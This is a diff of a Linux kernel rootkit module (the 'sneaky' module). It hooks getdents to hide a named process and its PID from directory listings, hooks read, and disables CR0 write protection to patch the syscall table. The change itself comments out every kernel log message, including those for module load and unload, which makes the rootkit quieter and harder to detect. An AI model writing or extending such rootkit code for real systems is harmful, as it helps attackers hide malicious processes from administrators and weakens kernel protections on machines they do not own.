@@ -83,7 +83,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
     d = (struct linux_dirent *)((char*)dirp + bpos);
     if ((strcmp(d->d_name, "sneaky_process") == 0) ||
         (strcmp(d->d_name, sneaky_pid) == 0)) {
-      printk(KERN_INFO "find sneaky_process or sneaky_pid");
+      // printk(KERN_INFO "find sneaky_process or sneaky_pid");
       memmove((char*)dirp + bpos, (char*)dirp + bpos+ d->d_reclen, nread - (bpos + d->d_reclen));
       nread -= d->d_reclen;
     }
@@ -106,7 +106,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
   line_end = NULL;
   nread = original_read(fd, buf, count);
   if (nread == -1) {
-    printk(KERN_INFO "error: cannot operate original read");
+    //printk(KERN_INFO "error: cannot operate original read");
   }
   if (nread == 0) {
     return 0;
@@ -129,7 +129,7 @@ static int initialize_sneaky_module(void) {
   struct page * page_ptr;
 
   //See /var/log/syslog for kernel print output
-  printk(KERN_INFO "Sneaky module being loaded.\n");
+  //printk(KERN_INFO "Sneaky module being loaded.\n");
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -160,7 +160,7 @@ static int initialize_sneaky_module(void) {
 static void exit_sneaky_module(void) {
   struct page * page_ptr;
 
-  printk(KERN_INFO "Sneaky module being unloaded.\n");
+  //printk(KERN_INFO "Sneaky module being unloaded.\n");
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
